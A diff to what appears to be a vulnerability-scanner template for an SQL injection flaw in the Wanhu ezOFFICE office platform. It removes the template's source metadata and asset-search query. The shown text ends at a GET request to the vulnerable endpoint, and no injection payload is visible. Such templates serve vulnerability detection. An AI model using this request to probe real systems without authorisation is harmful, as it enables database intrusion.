@@ -3,14 +3,8 @@ info:
   name: 万户协同办公平台ezofficegd_startUserCode存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/c947fa8bfb7f2fae0e6c77ffcab167a5
-
-    [!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: c947fa8bfb7f2fae0e6c77ffcab167a5
-    fofa: + hunter`app.name="万户 Ezoffice OA"`
 http:
 - raw:
   - 'GET /defaultroot/platform/bpm/ezflow/operation/ezflow_gd.jsp;?gd=1&gd_startUserCode=1 HTTP/1.1
